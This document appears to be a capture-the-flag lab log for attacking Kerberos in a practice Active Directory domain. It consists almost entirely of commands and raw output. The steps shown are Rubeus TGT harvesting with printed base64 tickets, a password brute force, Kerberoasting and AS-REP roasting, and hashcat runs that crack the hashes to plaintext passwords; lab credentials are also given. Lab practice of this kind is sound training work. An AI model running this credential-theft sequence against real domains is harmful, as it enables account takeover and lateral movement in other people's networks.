
Username: `Administrator`
Password: `P@$$W0rd`
Domain: `controller.local`
Your Machine IP is `10.10.182.49`

`ssh administrator@10.10.182.49`

```sh
C:\Users\Administrator\Downloads>Rubeus.exe harvest /interval:30

   ______        _
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Harvesting (with auto-renewal) 
[*] Monitoring every 30 seconds for new TGTs
[*] Displaying the working TGT cache every 30 seconds


[*] Refreshing TGT ticket cache (8/15/2025 11:26:28 AM)

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL 
  StartTime             :  8/15/2025 8:44:05 AM
  EndTime               :  8/15/2025 6:44:05 PM
  RenewTill             :  8/22/2025 8:44:05 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEjWz8N0SEson+vQ8zG7h/vjXXcQRqPxWI6zJ
    7uh4F20pzaEoR3fvJXygilqSGOr2cjija6uY82ZK/QVCBl/EGEKWauQ95bYq7VwxZNxz9kgWP9WSSExi/4efIhcDf8iJl5wVxd/o
    owYqRBYDdZ47MBWivqQMBzLUy2DjfMg6R2oP1mzlDjFtk/Cwso/O9fFGDPehS29y3Hzz0RHP8V1SFrk1B+8i23qvqxCAsvKL4rcV
    gaQ/YPuLLY4R+tt42JwicgP1CxW2cn7ByE3pQWtTC2WbObI2/+SCNIQncFJF0UvW8RuNSBQbBzegWMurk0ttfKaATdhY1De+GH2b
    IaDmqLc0PufGEMt1KpOutgV2Q5Y5GTUz4gKxmBTzhd57ffCyYMTreP++KQVUnJa7xE/N0V11Q4n3+WRyxdXbo4FSTqAVsflU/FAQ
    OPcYx9JX6T+AXiV63YePT+meA1s7LReYj35BXYd9Gz0c15TfAR+OXkB3auIfZ2r5xbqjrfqjP6hlKoOdWfPgVrpKvVtnRboEV1Qy
    a7YEmOLrke4ybNMfETelIPtaLEhjoUWW8hSVvZhQvaufG7IrfBAqF0t2n+r74tINOa8ziIegZbhKsxQcwJ1h6vI28GE3aDtYBeZx
    982PTg9tDDVkPGYyAazQYj+MAdjjoK/OFvMt2V9EkvkVuV0VlfdV6/RHAT4vk3H0hKxyBPGcqIPutc4B3CdYLcyBzsPxYNRgEvKt
    pv+B2vyz6ysnN2D/ka4vijTHQVNFBYNmaWjhtnzgru0V+JYjkycYhMx9L0ViyeJ0HffgAMv2pL9c6pfUlG3hGDQ8VsZ2aHrdzlc2
    YCKRmjL3EtQ7z83h33Kiadryk2OsEoTszikcj2MY3+em/raiuNYWKqVxvqN1N3ILDpTbbZ3sQ3krh7a8RvLso70W9C+HPKMYQpRC
    OPmkd7VUOkjZ/UazRCYQAEjzExI3lQR5nAKTGt7FgM7t0yJtDcjLVF7NMBHe8Nmsv163sDOhUREN2UYPFdcjg5S9ZdfqvETmFzNz
    TyXG38/ATnm76YtN0LMT181NCP/r1sYaW/RtAGEUDHzBzzOuBIjdbRdn/6t7b62OcGSx2H5EkcqG1f3Onqbb/o0la0ofa/gZxqme
    0SSJutY8eQetJDMkd2jg1VP2VFuMCNHikYMd6pEJIn5hwZuEDwkJgnm7eGEhvF3MfBlGvwEGKC5SS7QR76HIzfe+6j5cDTyQaVnc
    bN8nupPb2I85yv6D3gkh4BSE5du2eOK9s49Lcko7U6RnC7x7Cw9P/CRdyumIa5P0oZ7febxrzaPXkXX7sYBYXOVJZcTIL5D3cukl
    4V6NFdEH91zBWA/vYJUKKHt+cSWD8gKXfrc8Xw4m2VDZwgVQXqbRD0KjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCC9lYI3q1ZCOv9tRiCIF+d7tWTjP0pg72+X0sjQNhqwmqESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDI1MDgxNTE1NDQwNVqmERgPMjAyNTA4MTYwMTQ0MDVapxEYDzIwMjUwODIy
    MTU0NDA1WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  8/15/2025 8:44:05 AM
  EndTime               :  8/15/2025 6:44:05 PM
  RenewTill             :  8/22/2025 8:44:05 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEsF2cwkto7yhiK9KeoENoeVxx6jpidHKtFAW
    eDhsqoRwfmMs2EnHU73YCHZIcgcEyNwahxK43wuP0x0vpIEWdjS7EtIekLZ2797X0xBj6DnQ5mGPBGpXMpQuQke50vl0gC9pWJph
    e29aSBKl73clXo4AgUurn9TTNzxg/aD2YdiFh38qJoYwKac995oUn+xGxihaXDy0DFkO13ft9LBO60NkLP9dro4P5RbA/omn28EN
    4q5KKadyKfcIi3Uu7fi0FX0VwKDygWAu5z6Uw9DXAzcVbCh2XDB4a9MgW8EkjLPlwLMHDAmcJJW/v3/0cSErhnKPhNJscGNQFxQc
    vwzc3S14bD1A+SvyrDOu7x4eegkvZPVzV+y9VG30ha1Cl9z9+Y9N0fGMD1T/cSHp8DWFcvLv5r9FDr7oRFvx6M+ls91FdDnaTOY4
    mX/5gCZY/mGZvhIc5v4YCgU1k7wS+Wb1adVU+Ttc0CQJwspadthXAPW24/dkddbkPwvWOSIVh83dQXYyQwztpcJlb2TepuxXyNZ0
    T6t08mVnOEuDKEl7BnRsGxMN4QENzz37Am3iBWYfJXNn4ZVqHvcJ9Pxz3XGwcV4fMuthrGyues1ocVT1DGKJCf+AG68p15Kk7E4p
    SK9SkdKOF343mGOPnPhmkNN9bxx6t4r14qq4otSCAD31g+KE9woU+WZfAJlaIvz02flZd8eNs2NpyFtMzyGqiPMSKsqEcF6mpobd
    x7l5bTDplCOmJJfkb6eNG9e9QCGts+vxSSX67QKl8NjCnwGPDCt+J97PcYTdbO6IMqFWzNVMhN2eattJskUBA6r4N2pr88vsQO9M
    qJUA/SwycaV2sW9brCcALPDnP7X5V3aaXKpmTymwtXYTEqfoDux3qhg+pfdgWfhNjBZroVyb/kmTXI9MuJdA6mKePPBbzSTjeObc
    AaoISwSdvCuZXTeRD3d3oZj+JYb2EHCrblpBqLWI3N7Dnslak72UK3v9lNvlVqIwEdoZB4piRvCmkvs2ktA1VbCTJyL1k/NePV5t
    zw4bKSjHJL8yPz5E2mKXU+tLrFC9tQ1Rer9dGP4hhlFLY1HJiWpOn22qR0IslOW9ATMSKyIDs1RMyzFrmLJqoSJ0iNkcH+6gMOg5
    2F8Lp7VX8tWvv59d8I6fIWFV2TiBD0CCz2rQ55uFPTY+uOghFJvI7BMwApgPuMrqY/BC038NsR4RaqW0Ht93OrB1A4HtOLK2ddU5
    YLeuhOk9zmPZb3C4eVwUKbF5qQwksmOd+AQ0+PMDo9s0nIJpKL8Z03vZsG/0w3wrM4HTMsUaP3Vee+RWyGcXq4f/TRVbBIQDu5cg
    9FY0tz0gscXC7zPbxI/seLmD0fwwCtH8NrELvy6RDnItWlvNMa+bhnejgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCBNJ0ZHSHLHQyNEWNJfbx6dPMNX1oZE0rlASyx1w27egqESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAYKEAAKURGA8yMDI1MDgxNTE1NDQwNVqmERgPMjAyNTA4MTYwMTQ0MDVapxEYDzIwMjUwODIy
    MTU0NDA1WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  8/15/2025 10:58:44 AM
  EndTime               :  8/15/2025 8:58:44 PM
  RenewTill             :  8/22/2025 10:58:44 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
...
```

```sh
C:\Users\Administrator\Downloads>Rubeus.exe brute /password:Password1 /noticket

   ______        _
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest 
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7WQFFxHdgfX4OL6cJ3sEJCpHF8yETikEi7sHP1ti2rG3fvGDaXch9s4H8p3K9xXGOmuOtEKqwNUV
      z1EoUeuxo8FkTUjQs9n0ACp+bYROG0PSv/21Psn6DSJ047qae5PwqOIuUrvbBQ79d6L/Vykz+JL0rk85
      6tGCYftO51AJ2gJNa1Z+g360Z29q/b0+JirT08qmFQI4Fk3XBfXcU+U8w8Am508idDrgcc7hT+vfn7oo
      hqnCSFJrWL8LdVw806xUZZmp8ADPnBm1RQcePkwZ1jFWxByNQ9kN8C7apvbWOzBkacV7bMrzmUx1Xx7R
      xgDc3Z/gbiURLpXHFfr5r49pGEJtq0Q06pg+Rm6yyKJYrk4r+9j+uDcbb/MS2EpdpHiW3kttEOhBlnrT
      I8bhLYJt0lbBbB8xJVyZ78hl9scIYymxgGbtHlnoHHSp/lOrHUnD4pRJryQXqLvieaVqFrq92Jdy+XBv
      rPcTFIzhS6iwP5+y845XmLt0CcUTZ1nqOUUaZuHxv1p4SiuUFyZtRcLobh8EwTP/rigkaHXDfJTPcgG0
      Gi42F3r1XQ3UJzdlUzaJZGSl3vfyr0ag9823zdkSnl/Gl7vn4cGchcrwVD7rBU7S4jQEJ3BJqg5trE6t
      paxnhjth9o7sHPUe+c3JWLpuyyXQcVS8FPS2m82NkhBREHQEn3jQ31G616xEs68jIL2CziSFIKxbEmPt
      6lz+xYWIsAhzM4FxbpCCnk6OHH+hak30Q4139LDN9G5JRSnoGV3URHqPvwLOMfk6udbr4yUIzHIHbPGK
      dHBzHiI+f/t+ALsF6AqAYuF+de7zqxGmYiIK9Jif1X2ZmhS8gjkPe2aS8MSlU46YDdNSObyB6XD36wRe
      YBorhnuVAXLDCb4lgQzGccDnT3K+48cKhM0+ya9baCTJJE7ncw66j7gKyy13V/yPjpm+oFPAZr4ZYJVS
      +P5JEC/swRvaCQOVqdJunBiQ5ebmdJBWNk7c3RGIeI7kNpR06zuvKjBNvn/7xqkI5Fz4NVTkUesYDpIW
      1w9QQTWhBI7afp99IxKa3RoutDEcOXYFCTirHsl/8qRdv+JCc8tsx7I1GxOOF/ixKRwESknSt5hlevw8
      gxRB57/w0eUFzyPsXhkDk37oC4NrSKGUggeHt9rYcQeQ6D7MTcWg9i8joWPJYqcs66XTOr3cqbqMq4Rh
      NhiHGu8+2av7jKq/OWh4IbTLYZtz+G2D+6YYozVkFM9VDrKDf7iO2no8CAj0HT1UU3Vm/ADwvxuOoqVr
      iztDIltbSZNDcsMmKa921ChmdnrjyjVfGraoYJ29Gg2TYbo/L+f2RX11fwGmHtEuu6OB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEII+SlIXGITWvda8sPwiy1cZMJOzHt6VFM6PY
      bmb0RXtuoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDI1MDgxNTIwMDk0MFqmERgPMjAyNTA4MTYwNjA5NDBapxEYDzIwMjUwODIyMjAwOTQwWqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs


 
[+] Done
```

```sh
C:\Users\Administrator\Downloads>rubeus kerberoast /outfile:hashes.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 2


[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\Administrator\Downloads\hashes.txt


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Users\Administrator\Downloads\hashes.txt

[*] Roasted hashes written to : C:\Users\Administrator\Downloads\hashes.txt
```

```sh
┌──(fixit42㉿kali)-[~/boxes/thm/Attacking Kerberos]
└─$ hashcat hashes passwords.txt                   
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-7700K CPU @ 4.20GHz, 2898/5861 MB (1024 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: passwords.txt
* Passwords.: 1240
* Bytes.....: 9706
* Keyspace..: 1240
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

$krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.local:30222*$d58097387d02b23e0f527ca2016cafb9$887fe49db7357770c0be3f233b145a098e825774a9fea15e5eee3fc63f0cbe63964549c1f493f50c86b2d17f2f2e050e820ec6a03afc2a407536fcebd681a7710f8af99caae0263899ec4d6a876b5e91ab024b8715d3f25c98c2c1c38088cbda56650932e28a20a013ffd110c4592b37e909325b2fd4a6d81a52b40143d96fb649e748b1da3cec3ed1812acd27304d1c110474ae2f1e929c2760e311f9dda4a316d95b8f5b2aebf52c3f96c16f2bba5cb35e4ab5db61cb1d19e80dc64d5b186931efe4293d0deeb9932dc47c488c88461058c51a2053c26615ae9a2a18095c0ad6bd312aba3454fa7ef5a153cb5043dcf0885fff4910966587b70095a83181c83519673a9915931816599bbf96a5cc6967b0259f1f8195c4b888166e47867033e57fadabb6dad3fbb5ef4848a23b132902492059840a8355d9ca5fd3536dd0ce8aca22370e0c8e9e838555b52cd945e1789fdfd2de2744f8d2a2ed74e08cb3088f55a30949ed612db8b17d74184b0bb1ea530bc814c139cb4acd8033886f67e51b01b99bb0bfaafacf05ef6bf6f627e64d300e445807049a2f28568e71f4af6c27881310afd05fcf747f1c42272a5ac1028db4cede422fd989707e23a73bd6c335864c552fc9a67cf46b4ce3a513c144aaa43c3aa9efddacfd05c841a768212155725846665bfb02aae1db7e1e9670e9b9d7a52587370ebe94265ceb91e1dd20abcef157b4b3e07ef317e7ad61d7e2c0f6ebcdf405954bda993f486279437e68ba5561bc95cb2502118957b173ee1a0f244d4509719cfa2d17f84ed3484f4cf595f2754621563ba8308fb7248a963d30efeaee9e37e1ca40320fad0ac0fa1ff16ae69eb26edbf72b2dffb55ebd5c0755fd4a3c9f2ce344d668ebe00498f3d87e5f9bf8106f6f84f0434e267152b23a43ec3b009b9ee2194fc757f6f6208f0a9085f24eb76030c7ba04edca43b2fa01d7ac0eb0b647f1a38a509e4e6602f181598b37ae98e217f949aa57f7b315109624cb870c99be612884e5a6aae1ca4ebfde3a4b8f0be981fbd9f4978c742d6cb8619775bf71bd1212525821e509802ff029870ba7a0a86511d2da9fa58b8c5b26d680a90d082dd3053e906e8e43170ccdba6e3086cc8956ef28606b030f60f8f8d341adee0dc574438d63fa541b5cb11d6eb1f4314fbe60e16f5e8faca1899f736e28966052b55145cb2cffcfa9fefaaa889fddcb9d66373004fdff32d32daa2599a726884e13106d0b3d95c931610f07b0c34c93e238ad4c1df39b5b2c212dc35d77de59d5cc1de8525071a97f42ac41d227228b3a56ec56a5b72cee884b36cf3c04f5cb96d109bdd64e230b8b463a38a8c39da62779aec6ef35b73837fc6ed14eef0a6c07699d86842b254be4aa2111d6532d28eec8e730a6c0af94f866be90d49091a3633cebd8d0dd7fb067066188d74e85c704ea7829abc2532986552f547253ff2c2145a65055410058bbd60564f805ed77b12a6d6b6606bc11addfd1834cc03e8beadb3532a4e45b5a88bdc3c327c46cd7e1a475f8984888b60b239c7d334580a06326cae554036cf58d123fa24f92852857287aec1772d5d0329596542e01a0471dae4bd9c675461b8968b37a5e5a9c6a7b6ed296b5f54be761ec72241f:Summer2020
$krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.local:30111*$872591e592d12c9d56791df55da5b0d9$8f0c1bc70b3d6d4ca14005cd6d46b6408d09bd124ca24d25554531547bf499eb228d4639fe6b364430263811093066b27fc21819982bf6bc489c57cfc12423fddf7edd204af56776a31c8b0273e77bb83e4083400de3a336a46ab0626fc1ed9db3a16c8e55fce2ef18bb64e9a1e30cfa293c0e79e46a8e8c7b74ec28787a2983357afee6e3d465227c99d7bccde7f175afb2575ebecf5169f7a3f79ac528d7185af2e2d56460135eda5ac6c301c8a15c7492be90bfca64e27e7e2833fe2284571f65bb5369e8655a4c707ae82bdaf256674c3294fc34dfd2937482b43b380225c96cc265e01cba5d35bb4cfc524e352c9736fa4d661edefb56f0db66e1a809e0520372fe58d60caa04589089702a9668fbefcf92fe88b60492414c76c2d249e6b4ee113d8eb3f96269e3e63f78c2ab5b3071985cc26218dbcf6f036d59394d46ac60090f4ef905c866677eeec6a1dab7a529685d3a239e634967c4edb589cbccc1ca2c067f3a96a4173a591ae26c42f72e310319b5309dadd0b4a3b4170ab08d3f7e156fd2ead1923866d53b701414a2617575dc82d33d24426502353b888e7af3931400a04cce6ccd36d93450f02ecb4f731887635afcb5474679c161fcd35174d35ae45e2f14c12330263b14cb67f1c048c0238f1cf052371b4cd76a032a86532762f772a9f3957fc22255fd2612577c3d12e23006553bd31ad578211b9c019cb4c9b2e643a8c85cf283e55902e6413b1bb80626551913d89f6d2d245fc99081b26bdf5c00a73c1d5a0b6ebe44ba46ba900bc16b88aff0a438cd1667459256a8a41774421d54e908b8684ef8f21c768e87933f1af31222d414d0a5a343675bc01e0eab5ff39ab11a925062599f36d9c2e73220ed68d5cc8f3b962744ae0615cd5fe8d598d6d8d7e4ea3d0479918b077d32f13ae8bd35c6e79a4603290608973e790b90c0035ae01dbea0dda824940bea92dacc73cfcaf1b181d9cbca1f2520e54ee975cf51dbbe5fb8a98d1b59f91ec35602d5b693b872fe72e8534d553b38b6e46e3c7f9cfd7890d00d9d9b9b28a96defbc247f93ae082b36df6251ed8e3c430d9fbb3430c8994e146687f9810f13a0f08267a2b971d323dbcf7539ba542561379bd7246a62a28b9a7b0fc94a98021aa819567db331caa83e34e967f8e14f9455ec204295a11c79c1535a4c04a1534692a816b8ff3b38ba51d0d4974072249517af9251a06fa86d192c76c9489f267a17b2278b20ca8446871a166ed6ddeada5c6c58509386c13ec5897925c570688921973c6aa609d769a34cbf3e006a1d4b4e22841280e1578a58585bad09e6090543cd51f6dc8597a4bc11503c19e1824662c2d6d3983021adf18d05ef2af1b69cb6eb28b9ea5acf4d6c1366e583acac99ca02184978fd82f5e406a3b97502139164b7c47c8b57c5cf6feb43011e99e58aeb9df8a8d0efc0cc7bc97c6042134074ba62bd6a5da85ca9870104135aa2c0458d6ac22bff4639ece201abca26aa6dc93a33cb31d9d81710ff8d034521fb350ce6626bbb3f15fd9f0fce7ccf7ceb2ec28eca74a7ad083075f42f86def2334f1462b7c65a4e9e1c8b13ba199795d628a475eac5873ba116052bff79d7f0783dc575af093485e473c99c8fa4445f6e4f:MYPassword123#
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: hashes
Time.Started.....: Fri Aug 15 23:12:11 2025 (0 secs)
Time.Estimated...: Fri Aug 15 23:12:11 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwords.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   898.2 kH/s (0.88ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new), 2/2 (100.00%) Salts
Progress.........: 2480/2480 (100.00%)
Rejected.........: 0/2480 (0.00%)
Restore.Point....: 0/1240 (0.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> hello123
Hardware.Mon.#1..: Util: 26%

Started: Fri Aug 15 23:12:08 2025
Stopped: Fri Aug 15 23:12:13 2025
```

```sh
C:\Users\Administrator\Downloads>rubeus asreproast /outfile:hashes.txt
 
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::516f:ce80:996:f93f%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\Administrator\Downloads\hashes.txt

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::516f:ce80:996:f93f%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\Administrator\Downloads\hashes.txt

[*] Roasted hashes written to : C:\Users\Administrator\Downloads\hashes.txt
```

```sh
┌──(fixit42㉿kali)-[~/boxes/thm/Attacking Kerberos]
└─$ hashcat asrep-hashes passwords.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-7700K CPU @ 4.20GHz, 2898/5861 MB (1024 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

18200 | Kerberos 5, etype 23, AS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: passwords.txt
* Passwords.: 1240
* Bytes.....: 9706
* Keyspace..: 1240

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

$krb5asrep$Admin2@CONTROLLER.local:7824960e9ba737c3098b857aee6fb807$22b0384728d1867180bd1e0f22b64745e201366c57509625d50bc0777c538df9d79d4bb35a5d7dfd973026cd1698507a956f17c314b424d92cc81c9f8c8fd4c32e556b77a8f8341c7b2adebcc90af7050e83be1e6bb44a55426416643e4695b696a0d86fe3a7c90adbfeb0727c1f40c38707440effa429ba228dedda7a5d7f59ad9f31f7aebbc880061de5da1ef3141bd4236f616922f218d68688432c45a6d8445267ca76ca4e3d0e3500938d66303089ef46028482da4c698ed050a2c8c6093251facd39dc9b13aa366c85419901c098e749acb91ae52c8c1ab4fb85bfc53335ab253ee70e132bfd6f4151a7ce9360d3b459ca:P@$$W0rd2
$krb5asrep$User3@CONTROLLER.local:eaea0a3d6b7b254268d4fa0c107c2830$d62abcdcf6f299ab3ed4db6eed55f4536fb67b7e8e80ee54c118b42be79a4b7bad4f71d840e57fad9fa2ef2584ceaa19283b91bdff2e6d3c778b821d407f399e908185b2475845d2bf11b1b2f83d97e500c2f94316ed3f68bdbc78b9401cb03c5b221045bd7b57e18e797e17c03a18a666f3b50b435264bd0253b750597127924ec63fb8103f07eb5039a0fe1e89087d7cf6cea91dd0564839d1bfadf6e50c6188c9ae263a1141b20b16329ae5ff74e71e04a7b0bc9404de6397c488796915f2c8ea1b2fe69d97c8c601727ca3dbd186e58966e5c4a1e3aabff55148c83e94d90fd540f5e6f8852878738b70687e56341c5ae47f:Password3
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: asrep-hashes
Time.Started.....: Fri Aug 15 23:49:37 2025 (0 secs)
Time.Estimated...: Fri Aug 15 23:49:37 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (passwords.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   355.0 kH/s (0.70ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests (total), 2/2 (100.00%) Digests (new), 2/2 (100.00%) Salts
Progress.........: 2480/2480 (100.00%)
Rejected.........: 0/2480 (0.00%)
Restore.Point....: 0/1240 (0.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> hello123
Hardware.Mon.#1..: Util: 25%

Started: Fri Aug 15 23:49:13 2025
Stopped: Fri Aug 15 23:49:39 2025
```

